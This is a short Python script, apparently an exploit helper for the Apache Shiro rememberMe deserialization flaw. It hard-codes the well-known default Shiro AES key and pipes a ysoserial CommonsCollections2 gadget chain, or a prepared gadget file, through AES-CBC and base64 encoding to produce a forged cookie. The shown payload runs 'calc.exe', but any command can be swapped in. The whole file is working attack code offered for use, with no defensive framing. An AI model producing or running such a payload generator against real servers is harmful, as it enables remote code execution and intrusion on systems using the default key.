from Crypto.Cipher import AES
import base64, uuid
import subprocess

key = 'kPH+bIxk5D2deZiIxcaaaA=='


def encode(target):
    iv = uuid.uuid4().bytes
    realkey = base64.b64decode(key)
    mode = AES.MODE_CBC
    pad = lambda s: s + ((16 - len(s) % 16) * chr(16 - len(s) % 16)).encode()
    resultAES = AES.new(realkey, mode, iv)
    nice = resultAES.encrypt(pad(target))
    nice = iv + nice
    nice = base64.b64encode(nice)
    print("加密目标:\n" + str(target) + "\n\n加密结果:\n" + nice.decode("utf-8") + "\n")
    return nice


def decode(target):
    realkey = base64.b64decode(key)
    targetText = base64.b64decode(target)
    iv = targetText[0:16]
    realText = targetText[16:]
    mode = AES.MODE_CBC
    resultAES = AES.new(realkey, mode, iv)
    nice = (resultAES.decrypt(realText)).decode('utf-8', errors='ignore')
    print("\n解密目标:\n" + str(target) + "\n\n解密结果:\n" + nice + "\n")
    return nice


def use_ysoserial():
    # 把ysoserial.jar复制到当前目录
    popen = subprocess.Popen('java -jar ysoserial.jar CommonsCollections2 "calc.exe"', shell=True,
                             stdout=subprocess.PIPE)
    file_body = popen.stdout.read()
    encode(file_body)


def use_my_cc():
    fin = open(r"./CCDemo4.txt", "rb")
    byte = fin.read()
    fof = open(r"./2.txt", "wb")
    nice = encode(byte)
    fof.write(nice)


use_my_cc()

# use_ysoserial()
